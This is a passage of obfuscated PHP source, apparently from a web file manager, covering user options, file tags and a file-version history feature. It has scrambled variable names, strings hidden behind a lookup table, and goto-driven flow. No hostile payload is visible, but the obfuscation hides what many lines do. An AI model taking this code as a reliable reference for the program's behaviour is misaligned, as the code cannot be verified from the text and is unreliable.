(!$ñíıôßÇ || $this->taskID != $ñíıôßÇ[$¹Ë»êİ§[478]]) { return; } echoLog($¹Ë»êİ§[1889] . $ñíıôßÇ[$¹Ë»êİ§[1678]]); } } $_file = $_SERVER[$_SERVER[¼¥ÊĞÙÌ][957]]; $_size = $_SERVER[¼¥ÊĞÙÌ][958]; goto C¨å»ÏÎÊ­; F †°øÚ…Å: class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\x6f\160\x74\151\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($æŸ¶Í®) { $§£ØÚé =& $_SERVER[¼¥ÊĞÙÌ]; $Ÿƒ ˜û = defined($§£ØÚé[2219]) && USER_ID ? USER_ID : $§£ØÚé[12]; return "\125\x73\x65\162\x4f\160\x74\x69\x6f\x6e\137{$æŸ¶Í®}\x5f" . $Ÿƒ ˜û; } protected function filterWhere($•æÜâ£ô) { $Ó¸ÛÁËÑ =& $_SERVER[¼¥ÊĞÙÌ]; $•æÜâ£ô[$Ó¸ÛÁËÑ[1790]] = defined($Ó¸ÛÁËÑ[2219]) && USER_ID ? USER_ID : $Ó¸ÛÁËÑ[12]; return $•æÜâ£ô; } public function cacheRemoveUser($í¾ÃÈğğ, $Üş¬ˆÇ) { return Cache::remove("\125\163\x65\x72\117\160\164\x69\x6f\156\x5f{$í¾ÃÈğğ}\137" . $Üş¬ˆÇ); } protected function optionDefault($æªëß = '') { $¼…·¼Ø =& $_SERVER[¼¥ÊĞÙÌ]; if ($æªëß == $¼…·¼Ø[12]) { return $GLOBALS[$¼…·¼Ø[6]][$¼…·¼Ø[2535]]; } if ($æªëß == $¼…·¼Ø[2536]) { return $GLOBALS[$¼…·¼Ø[6]][$¼…·¼Ø[2537]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\x73\x65\x72\x2e\164\141\x67\114\x69\163\164"; public $modelType = "\125\163\x65\x72\117\x70\164\x69\157\x6e"; public $field = array("\x6e\141\x6d\145", "\163\164\171\x6c\145", "\x73\x6f\162\x74"); public function listData($ì¾ß–§¸ = false, $â±™ğ»ï = "\163\157\x72\164", $¿±ç®Œ× = false) { return parent::listData($ì¾ß–§¸, $â±™ğ»ï, $¿±ç®Œ×); } public function remove($”²ôÊÒÒ) { return parent::remove($”²ôÊÒÒ); } public function add($«ë²ñ÷, $şµ¿ Õö = "\154\x61\x62\145\154\x2d\147\x72\145\171\x2d\x6e\157\x72\155\x61\x6c") { $ùÌî¾Íâ =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->findByName($«ë²ñ÷)) { return !1; } $äÒµ© = array($ùÌî¾Íâ[497] => $«ë²ñ÷, $ùÌî¾Íâ[563] => $şµ¿ Õö, $ùÌî¾Íâ[1995] => $this->getSort($ùÌî¾Íâ[338]) + 1); return parent::insert($äÒµ©); } public function update($µµÂÇ†Ğ, $¸ş˜™˜§) { $—ºŒÄÅ» =& $_SERVER[¼¥ÊĞÙÌ]; $ÎêŠ ®Ó = $this->listData($µµÂÇ†Ğ); $®¢”Ê®¢ = $this->findByName($¸ş˜™˜§[$—ºŒÄÅ»[32]]); if (!$ÎêŠ ®Ó || $®¢”Ê®¢ && $®¢”Ê®¢[$—ºŒÄÅ»[478]] != $ÎêŠ ®Ó[$—ºŒÄÅ»[478]]) { return !1; } return parent::update($µµÂÇ†Ğ, $¸ş˜™˜§); } public function moveTop($Óâ¸—’€) { $Ğµ»æ€Ö =& $_SERVER[¼¥ÊĞÙÌ]; $á‰Êê = parent::listData(); $¹£Ê¥ßõ = $this->getSort($Ğµ»æ€Ö[337]); foreach ($á‰Êê as &$·â½¯©) { if ($·â½¯©[$Ğµ»æ€Ö[478]] == $Óâ¸—’€) { $·â½¯©[$Ğµ»æ€Ö[2015]] = $¹£Ê¥ßõ; continue; } $·â½¯©[$Ğµ»æ€Ö[2015]] += 1; } unset($·â½¯©); return parent::resetData($á‰Êê); } public function moveBottom($ºûÜ€åÑ) { $¹•¯õ =& $_SERVER[¼¥ÊĞÙÌ]; $ƒéé£è = $this->getSort($¹•¯õ[338]) + 1; return parent::update($ºûÜ€åÑ, array($¹•¯õ[2015] => $ƒéé£è)); } public function resetSort($‚µ“ô‚È) { $ğœ‡•¡å =& $_SERVER[¼¥ÊĞÙÌ]; $õÇßÉô” = array(); $‚µ“ô‚È = is_array($‚µ“ô‚È) ? $‚µ“ô‚È : array(); for ($­òÙ»ºë = 0; $­òÙ»ºë < count($‚µ“ô‚È); $­òÙ»ºë++) { $õÇßÉô”[$‚µ“ô‚È[$­òÙ»ºë] . $ğœ‡•¡å[12]] = $­òÙ»ºë + 1; } $Ò…¡¶·³ = parent::listData(); foreach ($Ò…¡¶·³ as &$À¼ë§æ›) { $“ÏñÖ¢Ô = $õÇßÉô”[$À¼ë§æ›[$ğœ‡•¡å[478]]]; $À¼ë§æ›[$ğœ‡•¡å[2015]] = $“ÏñÖ¢Ô ? $“ÏñÖ¢Ô : $À¼ë§æ›[$ğœ‡•¡å[2015]]; } unset($À¼ë§æ›); return parent::resetData($Ò…¡¶·³); } private function getSort($×‹Âå¯ü) { $“…“Ö° =& $_SERVER[¼¥ÊĞÙÌ]; $é’©î°‚ = parent::listData(); $ä¹‚•†à = array_to_keyvalue($é’©î°‚, $“…“Ö°[12], $“…“Ö°[2015]); if (!$ä¹‚•†à) { $ä¹‚•†à = array(0); } $º€½Âó‹ = $×‹Âå¯ü == $“…“Ö°[338] ? max($ä¹‚•†à) : min($ä¹‚•†à); return intval($º€½Âó‹); } } goto c¯ì­î½‡Í; D½ß°©îÊØ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $›½ÕĞì =& $_SERVER[¼¥ÊĞÙÌ]; $«ûùŒá = $GLOBALS[$›½ÕĞì[6]][$›½ÕĞì[92]]; if ($«ûùŒá[$›½ÕĞì[1313]] != 1) { return; } if ($«ûùŒá[$›½ÕĞì[1314]] <= 0) { return; } if (isset($_REQUEST[$›½ÕĞì[1315]]) && $_REQUEST[$›½ÕĞì[1315]] == $›½ÕĞì[91]) { return; } Hook::bind($›½ÕĞì[1316], $›½ÕĞì[1317]); Hook::bind($›½ÕĞì[1318], $›½ÕĞì[1319]); Hook::bind($›½ÕĞì[1320], $›½ÕĞì[1321]); Hook::bind($›½ÕĞì[1322], $›½ÕĞì[1323]); Hook::bind($›½ÕĞì[1324], $›½ÕĞì[1325]); Hook::bind($›½ÕĞì[1326], $›½ÕĞì[1327]); } public static function eventBeforeUpload($ëÜÑÆ¹Á) { if ($ëÜÑÆ¹Á[3] && $ëÜÑÆ¹Á[3] != REPEAT_REPLACE) { return; } $û‹”ˆÈ… = self::parsePath($ëÜÑÆ¹Á[0]); if (!$û‹”ˆÈ…) { return; } self::add($û‹”ˆÈ…); } public static function eventBeforeEdit($ë…ÈÒ€) { $µ˜²üíö = self::parsePath($ë…ÈÒ€[0]); if (!$µ˜²üíö) { return; } self::add($µ˜²üíö); } public static function eventBeforeCopyFile($³µ•ÊÎš, $„¯æ³¡, $™šî“áø, $•Ÿ²®Ó˜, $»¡­·ƒà, $ÈÌ±ƒ½õ) { $æÀ×ì°ø =& $_SERVER[¼¥ÊĞÙÌ]; if (isset($™šî“áø->_data[$æÀ×ì°ø[1246]]) && $™šî“áø->_data[$æÀ×ì°ø[1246]]) { return; } $‰¯ı«‡« = $™šî“áø->getPathOuter($•Ÿ²®Ó˜); $œà‰Ï = self::parsePath($‰¯ı«‡«); if (!$œà‰Ï) { return; } self::add($œà‰Ï); } public static function eventBeforeRename($©á±Å§) { $—¿„Ù¨³ =& $_SERVER[¼¥ÊĞÙÌ]; $¡ï›´‰Ş = self::parsePath($©á±Å§[0]); if (!$¡ï›´‰Ş) { return; } $€ÔÅùÑ = self::checkInHistory($¡ï›´‰Ş); if (!$€ÔÅùÑ) { return; } if ($€ÔÅùÑ[$—¿„Ù¨³[33]] == $—¿„Ù¨³[233]) { $±å÷¤Ì› = self::listData($¡ï›´‰Ş); if ($±å÷¤Ì› && $±å÷¤Ì›[$—¿„Ù¨³[448]]) { self::moveHistory($¡ï›´‰Ş, $©á±Å§[1]); } } else { IO::rename($€ÔÅùÑ[$—¿„Ù¨³[87]], $©á±Å§[1]); } } public static function eventBeforeMove($—ÆÓöäù) { $Ö˜ëµïÌ =& $_SERVER[¼¥ÊĞÙÌ]; $×°û›ã¯ = self::parsePath($—ÆÓöäù[0]); if (!$×°û›ã¯) { return; } $»¤Ü³Æ = self::parsePath($—ÆÓöäù[1]); if (!$»¤Ü³Æ) { return; } $Ó×¦ÑËı = $—ÆÓöäù[3]; $Õ¼õØ© = self::checkInHistory($×°û›ã¯); if (!$Õ¼õØ©) { return; } $ı¼í«™€ = self::pathHistory($»¤Ü³Æ); if ($Õ¼õØ©[$Ö˜ëµïÌ[33]] == $Ö˜ëµïÌ[233]) { $‹¿“«—® = self::listData($×°û›ã¯); $¬Ÿ¶ÌØø = rtrim($»¤Ü³Æ, $Ö˜ëµïÌ[8]) . $Ö˜ëµïÌ[8] . ($Ó×¦ÑËı ? $Ó×¦ÑËı : get_path_this($×°û›ã¯)); $›¾áËóÎ = self::listData($¬Ÿ¶ÌØø); if ($‹¿“«—® && $‹¿“«—®[$Ö˜ëµïÌ[448]] && $›¾áËóÎ && $›¾áËóÎ[$Ö˜ëµïÌ[448]]) { return self::clear($×°û›ã¯); } if ($‹¿“«—® && $‹¿“«—®[$Ö˜ëµïÌ[448]]) { self::moveHistory($×°û›ã¯, $Ó×¦ÑËı, $ı¼í«™€); } } else { IO::move($Õ¼õØ©[$Ö˜ëµïÌ[87]], $ı¼í«™€, !1, $Ó×¦ÑËı); self::clearEmptyFolder(IO::pathFather($Õ¼õØ©[$Ö˜ëµïÌ[87]])); } } public static function eventAfterRemove($‹“ËÌÊ«, $¹ØÚšŒ) { $ì®¬ø¾ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$¹ØÚšŒ) { return; } $ëÍÄÊè = self::parsePath($‹“ËÌÊ«[0]); if (!$ëÍÄÊè) { return; } $Â¸´š€‚ = self::checkInHistory($ëÍÄÊè); if (!$Â¸´š€‚) { return; } if ($Â¸´š€‚[$ì®¬ø¾[33]] == $ì®¬ø¾[233]) { $Æ÷­èìÏ = self::listData($ëÍÄÊè, !1); if ($Æ÷­èìÏ && $Æ÷­èìÏ[$ì®¬ø¾[448]]) { self::clear($ëÍÄÊè, !1); } } else { IO::remove($Â¸´š€‚[$ì®¬ø¾[87]]); self::clearEmptyFolder(IO::pathFather($Â¸´š€‚[$ì®¬ø¾[87]])); } } private static function checkInHistory($‘…ÆÆ®) { $òïÀˆ = self::pathHistory($‘…ÆÆ®); if (!IO::exist($òïÀˆ)) { $òïÀˆ .= $_SERVER[¼¥ÊĞÙÌ][1328]; } return IO::exist($òïÀˆ) ? IO::info($òïÀˆ) : !1; } private static function parsePath($ªıß†óÂ) { $”­ÁÜìæ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ªıß†óÂ) { return !1; } if (isset($GLOBALS[$”­ÁÜìæ[1329]]) && $GLOBALS[$”­ÁÜìæ[1329]]) { return; } $“Çåü˜ = KodIO::parse($ªıß†óÂ); $•º’¼„Ÿ = $“Çåü˜[$”­ÁÜìæ[33]]; $ßŞ³”Õ = !$•º’¼„Ÿ || $•º’¼„Ÿ == KodIO::KOD_IO || $•º’¼„Ÿ == KodIO::KOD_SHARE_ITEM; if (!$ßŞ³”Õ || !$“Çåü˜[$”­ÁÜìæ[1330]]) { return !1; } if (substr($ªıß†óÂ, 0, strlen(DATA_PATH . $”­ÁÜìæ[1331])) == DATA_PATH . $”­ÁÜìæ[1331]) { return !1; } if ($•º’¼„Ÿ == KodIO::KOD_SHARE_ITEM) { $¹ÔÄšœÖ = IO::init($ªıß†óÂ); if ($¹ÔÄšœÖ->pathParse[$”­ÁÜìæ[1242]]) { return self::parsePath($¹ÔÄšœÖ->pathParse[$”­ÁÜìæ[1242]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ğ™¾®­¸ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $”­ÁÜìæ[1332]); foreach ($ğ™¾®­¸ as $¬œ­™¡›) { if (!$•º’¼„Ÿ && substr($ªıß†óÂ, 0, strlen($¬œ­™¡›)) == $¬œ­™¡›) { return !1; } } self::log($GLOBALS[$”­ÁÜìæ[1237]] . $”­ÁÜìæ[1333] . $ªıß†óÂ); return $ªıß†óÂ; } private static function pathHistory($Ğï´ªÄÄ) { $‚Ó˜µ³ =& $_SERVER[¼¥ÊĞÙÌ]; $˜Ôúë’â = self::$_historyBase . ltrim(KodIO::clear($Ğï´ªÄÄ), $‚Ó˜µ³[8]); $˜Ôúë’â = str_replace(array($‚Ó˜µ³[1334]), array($‚Ó˜µ³[1335]), $˜Ôúë’â); return $˜Ôúë’â; } public static function log($áæÂ×ßà) { } public static function historyCount($ö˜ë¢Îå) { $…ö’´¡û =& $_SERVER[¼¥ÊĞÙÌ]; $à¡“òêÏ = array(); $„ÅòƒĞå = array(); foreach ($ö˜ë¢Îå as $…âŞ“Öü) { $í¬®ØµÁ = get_path_father($…âŞ“Öü); if (!$„ÅòƒĞå[$í¬®ØµÁ]) { $„ÅòƒĞå[$í¬®ØµÁ] = array(); } $„ÅòƒĞå[$í¬®ØµÁ][] = get_path_this($…âŞ“Öü); } foreach ($„ÅòƒĞå as $í¬®ØµÁ => $Ñ‰¯§œ) { $¨ª‰óõ³ = self::parsePath($í¬®ØµÁ); if (!$¨ª‰óõ³) { continue; } foreach ($Ñ‰¯§œ as $•´ŸÃÉ¹) { $‘Ğ´§¤µ = self::listData(rtrim($¨ª‰óõ³, $…ö’´¡û[8]) . $…ö’´¡û[8] . $•´ŸÃÉ¹, !1); if ($‘Ğ´§¤µ && $‘Ğ´§¤µ[$…ö’´¡û[448]]) { $à¡“òêÏ[rtrim($í¬®ØµÁ, $…ö’´¡û[8]) . $…ö’´¡û[8] . $•´ŸÃÉ¹] = count($‘Ğ´§¤µ[$…ö’´¡û[448]]); } } } return $à¡“òêÏ; } public static function add($º¿ôŞî) { $Ù•×·ƒ¶ =& $_SERVER[¼¥ÊĞÙÌ]; $Ùö­Â = self::listData($º¿ôŞî); if (!$Ùö­Â) { return; } $‚âÏ°•â = Model($Ù•×·ƒ¶[844])->get($Ù•×·ƒ¶[1336]); $ºÜÛçç¸ = intval($GLOBALS[$Ù•×·ƒ¶[6]][$Ù•×·ƒ¶[92]][$Ù•×·ƒ¶[1314]]); $°…şËÊğ = $‚âÏ°•â == $Ù•×·ƒ¶[1337] ? min(5, $ºÜÛçç¸) : $ºÜÛçç¸; if ($ºÜÛçç¸ <= 0) { return; } $Å”Äåª = IO::info($º¿ôŞî); $úæãŸÍ“ = $Ùö­Â[$Ù•×·ƒ¶[448]]; if ($Å”Äåª[$Ù•×·ƒ¶[79]] == 0) { return; } if ($Å”Äåª[$Ù•×·ƒ¶[79]] >= 1024 * 1024 * 500) { return !1; } $ÜÓòâç = IO::hashSimple($º¿ôŞî); if ($úæãŸÍ“ && $úæãŸÍ“[0][$Ù•×·ƒ¶[680]] == $ÜÓòâç) { return !0; } if (array_key_exists($Ù•×·ƒ¶[236], $Å”Äåª) && !$Å”Äåª[$Ù•×·ƒ¶[236]]) { return !1; } $•’€Üô® = short_id(time()); $Î»µÆë¾ = array($Ù•×·ƒ¶[478] => $•’€Üô®, $Ù•×·ƒ¶[680] => $ÜÓòâç, $Ù•×·ƒ¶[32] => $Å”Äåª[$Ù•×·ƒ¶[32]] . $Ù•×·ƒ¶[10] . date($Ù•×·ƒ¶[1338]) . rand_string(1), $Ù•×·ƒ¶[79] => $Å”Äåª[$Ù•×·ƒ¶[79]], $Ù•×·ƒ¶[530] => USER_ID, $Ù•×·ƒ¶[234] => time(), $Ù•×·ƒ¶[1339] => $Ù•×·ƒ¶[12]); IO::mkdir($Ùö­Â[$Ù•×·ƒ¶[1340]]); $ğß¨Ë›Ğ = IO::copy($º¿ôŞî, $Ùö­Â[$Ù•×·ƒ¶[1340]], !1, $Î»µÆë¾[$Ù•×·ƒ¶[32]]); if (!$ğß¨Ë›Ğ) { self::clearEmptyFolder($Ùö­Â[$Ù•×·ƒ¶[1340]]); return !1; } array_unshift($úæãŸÍ“, $Î»µÆë¾); if (count($úæãŸÍ“) > $°…şËÊğ) { $ÜŞ¨ƒ¯¸ = array_slice($úæãŸÍ“, $°…şËÊğ); foreach ($ÜŞ¨ƒ¯¸ as $áˆ¹şÛí) { IO::remove($Ùö­Â[$Ù•×·ƒ¶[1340]] . $áˆ¹şÛí[$Ù•×·ƒ¶[32]]); } $úæãŸÍ“ = array_slice($úæãŸÍ“, 0, $°…şËÊğ); } return self::saveData($Ùö­Â[$Ù•×·ƒ¶[1341]], $úæãŸÍ“); } public static function remove($úâ¸“…·, $‹—‰ºşœ) { $ÀıÕ² =& $_SERVER[¼¥ÊĞÙÌ]; $Îİó•¡Ó = self::listData($úâ¸“…·); $¥¨ìòÀÛ = array(); if (!$Îİó•¡Ó) { return !1; } foreach ($Îİó•¡Ó[$ÀıÕ²[448]] as $ÅÁ©›¦) { if ($ÅÁ©›¦[$ÀıÕ²[478]] == $‹—‰ºşœ) { IO::remove($Îİó•¡Ó[$ÀıÕ²[1340]] . $ÅÁ©›¦[$ÀıÕ²[32]]); continue; } $¥¨ìòÀÛ[] = $ÅÁ©›¦; } return self::saveData($Îİó•¡Ó[$ÀıÕ²[1341]], $¥¨ìòÀÛ); } public static function clear($ÄİãÑúş, $¿ÌºŞ¥Æ = true) { $€€ØÛËÂ =& $_SERVER[¼¥ÊĞÙÌ]; $±Ø†ÎÑ = self::listData($ÄİãÑúş, $¿ÌºŞ¥Æ); if (!$±Ø†ÎÑ) { return !1; } foreach ($±Ø†ÎÑ[$€€ØÛËÂ[448]] as $éûõ…¯›) { IO::remove($±Ø†ÎÑ[$€€ØÛËÂ[1340]] . $éûõ…¯›[$€€ØÛËÂ[32]]); } return self::saveData($±Ø†ÎÑ[$€€ØÛËÂ[1341]], array()); } public static function moveHistory($ªûÀ¢­Ô, $Å‚‹ß‘ = '', $Æ«Œ÷ø = '') { $˜´Îğ =& $_SERVER[¼¥ÊĞÙÌ]; $Óè¨ÑôÉ = self::listData($ªûÀ¢­Ô, !1); if (!$Óè¨ÑôÉ || !$Óè¨ÑôÉ[$˜´Îğ[448]]) { return !1; } $«ìëŠ–› = $˜´Îğ[1328]; $Å‚‹ß‘ = $Å‚‹ß‘ ? $Å‚‹ß‘ : get_path_this($ªûÀ¢­Ô); $Æ«Œ÷ø = $Æ«Œ÷ø ? $Æ«Œ÷ø : $Óè¨ÑôÉ[$˜´Îğ[1340]]; $§€ÕœÓ = substr(get_path_this($Óè¨ÑôÉ[$˜´Îğ[1341]]), 0, -strlen($«ìëŠ–›)); foreach ($Óè¨ÑôÉ[$˜´Îğ[448]] as $âúÉ¶Ú => $—…¿æ) { $¡óÏ»Åº = $Å‚‹ß‘ . substr($—…¿æ[$˜´Îğ[32]], strlen($§€ÕœÓ)); $şÍ´¬ë´ = IO::move($Óè¨ÑôÉ[$˜´Îğ[1340]] . $—…¿æ[$˜´Îğ[32]], $Æ«Œ÷ø, !1, $¡óÏ»Åº); if ($şÍ´¬ë´) { $Óè¨ÑôÉ[$˜´Îğ[448]][$âúÉ¶Ú][$˜´Îğ[32]] = $¡óÏ»Åº; } } $Óè¨ÑôÉ[$˜´Îğ[1341]] = IO::move($Óè¨ÑôÉ[$˜´Îğ[1341]], $Æ«Œ÷ø, !1, $Å‚‹ß‘ . $«ìëŠ–›); self::saveData($Óè¨ÑôÉ[$˜´Îğ[1341]], $Óè¨ÑôÉ[$˜´Îğ[448]]); self::clearEmptyFolder($Óè¨ÑôÉ[$˜´Îğ[1340]]); } public static function rollback($ƒü–ªîá, $ÌıôÕ—Ë) { $³ë°»ÌÎ =& $_SERVER[¼¥ÊĞÙÌ]; $…ïÜ—¹ş = self::listData($ƒü–ªîá); if (!$…ïÜ—¹ş) { return; } $Œèéõ = IO::info($ƒü–ªîá); foreach ($…ïÜ—¹ş[$³ë°»ÌÎ[448]] as $‚ï¯ûµÑ => $®ò¸Ğ) { if ($®ò¸Ğ[$³ë°»ÌÎ[478]] == $ÌıôÕ—Ë) { self::add($ƒü–ªîá); $’¶­—µ = $…ïÜ—¹ş[$³ë°»ÌÎ[1340]] . $®ò¸Ğ[$³ë°»ÌÎ[32]]; $æ £¥îü = IO::copy($’¶­—µ, IO::pathFather($ƒü–ªîá), REPEAT_REPLACE, $Œèéõ[$³ë°»ÌÎ[32]]); if ($æ £¥îü) { self::remove($ƒü–ªîá, $ÌıôÕ—Ë); } return $æ £¥îü; } } return !1; } public static function setDetail($§òÃáøÀ, $‹ìÓÚŞ¶, $ıÔØë®å) { $ÂßÏÖø =& $_SERVER[¼¥ÊĞÙÌ]; $¥Ùï± Š = self::listData($§òÃáøÀ); if (!$¥Ùï± Š) { return; } foreach ($¥Ùï± Š[$ÂßÏÖø[448]] as $’ºêå×È => $ìİÌğ–½) { if ($ìİÌğ–½[$ÂßÏÖø[478]] == $‹ìÓÚŞ¶) { $¥Ùï± Š[$ÂßÏÖø[448]][$’ºêå×È][$ÂßÏÖø[1339]] = $ıÔØë®å; self::saveData($¥Ùï± Š[$ÂßÏÖø[1341]], $¥Ùï± Š[$ÂßÏÖø[448]]); return !0; } } return !1; } public static function fileInfo($ÉÆŞéªã, $Ÿ´–íÓï) { $÷›ÖÃÍ =& $_SERVER[¼¥ÊĞÙÌ]; $¯ºé… = self::listData($ÉÆŞéªã); if (!$¯ºé…) { show_json(LNG($÷›ÖÃÍ[108]), !1); } $…©Ğ‘•ƒ = $÷›ÖÃÍ[12]; foreach ($¯ºé…[$÷›ÖÃÍ[448]] as $­Îãá«ª => $Ğêç”£) { if ($Ğêç”£[$÷›ÖÃÍ[478]] != $Ÿ´–íÓï) { continue; } $…©Ğ‘•ƒ = $¯ºé…[$÷›ÖÃÍ[1340]] . $Ğêç”£[$÷›ÖÃÍ[32]]; break; } if (!$…©Ğ‘•ƒ) { show_json(LNG($÷›ÖÃÍ[108]), !1); } return IO::info($…©Ğ‘•ƒ); } public static function fileOut($£Üï¢ì, $û€ÊõÉ¼, $ü±¥ÅäÖ = false) { $Õä¡Ù€à =& $_SERVER[¼¥ÊĞÙÌ]; $Ò§šæ¼ = self::fileInfo($£Üï¢ì, $û€ÊõÉ¼); $”É²œº— =& $GLOBALS[$Õä¡Ù€à[7]]; $ü±¥ÅäÖ = isset($”É²œº—[$Õä¡Ù€à[1291]]) && $”É²œº—[$Õä¡Ù€à[1291]] == 1; if (isset($”É²œº—[$Õä¡Ù€à[33]]) && $”É²œº—[$Õä¡Ù€à[33]] == $Õä¡Ù€à[1342]) { return IO::fileOutImage($Ò§šæ¼[$Õä¡Ù€à[87]], $”É²œº—[$Õä¡Ù€à[1343]]); } IO::fileOut($Ò§šæ¼[$Õä¡Ù€à[87]], $ü±¥ÅäÖ, get_path_this($£Üï¢ì)); } public static function listData($±´Î­éê, $…±æ¡¼™ = true) { $ğïÔã© =& $_SERVER[¼¥ÊĞÙÌ]; if ($…±æ¡¼™ && !IO::exist($±´Î­éê)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($±´Î­éê, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Ğ‚÷ø = self::pathHistory($±´Î­éê); $ÑçÏœ§¨ = array($ğïÔã©[1341] => $Ğ‚÷ø . $ğïÔã©[1328], $ğïÔã©[1340] => rtrim(get_path_father($Ğ‚÷ø), $ğïÔã©[8]) . $ğïÔã©[8], $ğïÔã©[448] => array()); $ÒÁÍÅ©È = IO::getContent($ÑçÏœ§¨[$ğïÔã©[1341]]); if ($ÒÁÍÅ©È) { $ğõƒ³Ì© = json_decode($ÒÁÍÅ©È, !0); if (is_array($ğõƒ³Ì©)) { $ÑçÏœ§¨[$ğïÔã©[448]] = $ğõƒ³Ì©; } } return $ÑçÏœ§¨; } private static function saveData($ß­¶Øù¬, $Ö¿ù¹«) { $×­€Ù•Ì =& $_SERVER[¼¥ÊĞÙÌ]; self::log($×­€Ù•Ì[1344] . $ß­¶Øù¬ . $×­€Ù•Ì[74] . count($Ö¿ù¹«), $×­€Ù•Ì[826]); if ($Ö¿ù¹«) { return IO::setContent($ß­¶Øù¬, json_encode($Ö¿ù¹«)); } $À¾ª‹ùÎ = IO::pathFather($ß­¶Øù¬); IO::remove($ß­¶Øù¬); self::clearEmptyFolder($À¾ª‹ùÎ); return !0; } public static function clearEmptyFolder($åÀë¬äß) { $Óàû¡¡Ù =& $_SERVER[¼¥ÊĞÙÌ]; if (trim($åÀë¬äß, $Óàû¡¡Ù[8]) == trim(self::$_historyBase, $Óàû¡¡Ù[8])) { return; } $Æ÷êƒı = IO::pathFather($åÀë¬äß); $˜’¬ŞĞ™ = IO::has($åÀë¬äß, !0); if ($˜’¬ŞĞ™[$Óàû¡¡Ù[242]] > 0 || $˜’¬ŞĞ™[$Óàû¡¡Ù[243]] > 0) { return; } IO::remove($åÀë¬äß); self::clearEmptyFolder($Æ÷êƒı); } private static function getBasePath() { $‹¯Ô½¼å =& $_SERVER[¼¥ÊĞÙÌ]; $­Í²Ö•Ò = Model($‹¯Ô½¼å[1345])->get($‹¯Ô½¼å[1346]); if ($­Í²Ö•Ò) { if (!IO::exist($­Í²Ö•Ò)) { IO::mkdir($­Í²Ö•Ò); } if (get_path_this($­Í²Ö•Ò) == $‹¯Ô½¼å[1331]) { $˜ÇÅøî» = $‹¯Ô½¼å[1347] . rand_string(8); @rename($­Í²Ö•Ò, get_path_father($­Í²Ö•Ò) . $‹¯Ô½¼å[8] . $˜ÇÅøî»); $­Í²Ö•Ò = DATA_PATH . $˜ÇÅøî» . $‹¯Ô½¼å[8]; file_put_contents(DATA_PATH . $‹¯Ô½¼å[1278], $‹¯Ô½¼å[12]); Model($‹¯Ô½¼å[1345])->set($‹¯Ô½¼å[1346], $­Í²Ö•Ò); } return $­Í²Ö•Ò; } $­Í²Ö•Ò = DATA_PATH . $‹¯Ô½¼å[1347] . rand_string(8) . $‹¯Ô½¼å[8]; $­Í²Ö•Ò = IO::mkdir($­Í²Ö•Ò); $­Í²Ö•Ò = rtrim($­Í²Ö•Ò, $‹¯Ô½¼å[8]) . $‹¯Ô½¼å[8]; file_put_contents($­Í²Ö•Ò . $‹¯Ô½¼å[1278], $‹¯Ô½¼å[12]); file_put_contents(DATA_PATH . $‹¯Ô½¼å[1278], $‹¯Ô½¼å[12]); Model($‹¯Ô½¼å[1345])->set($‹¯Ô½¼å[1346], $­Í²Ö•Ò); return $­Í²Ö•Ò; } } class KodIO { const KOD_SOURCE = "\173\163\157\165\162\143\145\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\x65\x63\171\143\154\x65\175"; const KOD_USER_FAV = "\x7b\x75\163\x65\162\106\141\166\175"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\106\151\x6c\145\124\x61\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\162\x46\x69\154\145\x54\x79\x70\x65\175"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\122\157\157\x74\x53\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\x53\x68\141\x72\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\145\162\123\150\x61\x72\x65\x4c\x69\x6e\153\x7d"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\150\141\162\145\124\157\x4d\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\x72\x65\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\163\150\141\162\x65\111\x74\145\155\114\151\156\153\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\x68\x7d"; const KOD_BLOCK = "\173\x62\x6c\157\x63\153\x7d"; const KOD_IO = "\173\x69\157\175"; const KOD_USER_RECENT = "\173\165\x73\x65\162\122\145\156\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\x64\162\x69\x76\145\x72\175"; public static function typeList() { $Õ£íàÉÃ =& $_SERVER[¼¥ÊĞÙÌ]; return array($Õ£íàÉÃ[1348] => self::KOD_SOURCE, $Õ£íàÉÃ[1349] => self::KOD_USER_RECYCLE, $Õ£íàÉÃ[1350] => self::KOD_USER_FAV, $Õ£íàÉÃ[1351] => self::KOD_USER_FILE_TAG, $Õ£íàÉÃ[1352] => self::KOD_USER_FILE_TYPE, $Õ£íàÉÃ[1353] => self::KOD_GROUP_ROOT_SELF, $Õ£íàÉÃ[1354] => self::KOD_USER_SHARE, $Õ£íàÉÃ[1355] => self::KOD_USER_SHARE_LINK, $Õ£íàÉÃ[1356] => self::KOD_USER_SHARE_TO_ME, $Õ£íàÉÃ[1357] => self::KOD_SHARE_ITEM, $Õ£íàÉÃ[1358] => self::KOD_SHARE_LINK, $Õ£íàÉÃ[1359] => self::KOD_SEARCH, $Õ£íàÉÃ[1360] => self::KOD_BLOCK, $Õ£íàÉÃ[1361] => self::KOD_IO, $Õ£íàÉÃ[1362] => self::KOD_USER_RECENT, $Õ£íàÉÃ[1363] => self::KOD_USER_DRIVER); } public static function parse($œï—îüŸ) { $ ¤˜Õ›ğ =& $_SERVER[¼¥ÊĞÙÌ]; $œï—îüŸ = self::clear($œï—îüŸ); $¨Ó†—¯Ã = array_values(self::typeList()); preg_match($ ¤˜Õ›ğ[1364], $œï—îüŸ, $¤Ãá¹ü ); $­ÑÁŞüÉ = array($ ¤˜Õ›ğ[499] => !1, $ ¤˜Õ›ğ[1365] => !1, $ ¤˜Õ›ğ[496] => !1, $ 